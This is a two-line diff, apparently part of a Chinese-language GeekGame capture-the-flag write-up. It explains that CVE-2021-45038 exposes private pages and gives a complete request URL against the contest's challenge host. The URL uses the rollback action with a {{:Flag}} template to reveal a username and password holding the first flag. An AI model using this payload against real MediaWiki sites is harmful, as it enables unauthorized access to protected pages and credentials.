@@ -1,0 +1,2 @@
+利用CVE-2021-45038（详见附件），就能访问所谓的private页面。
+于是，访问 https://prob07-tmylvyld.geekgame.pku.edu.cn/index.php?action=rollback&from={{:Flag}} ，即可得到一套包含flag1的用户名&密码。
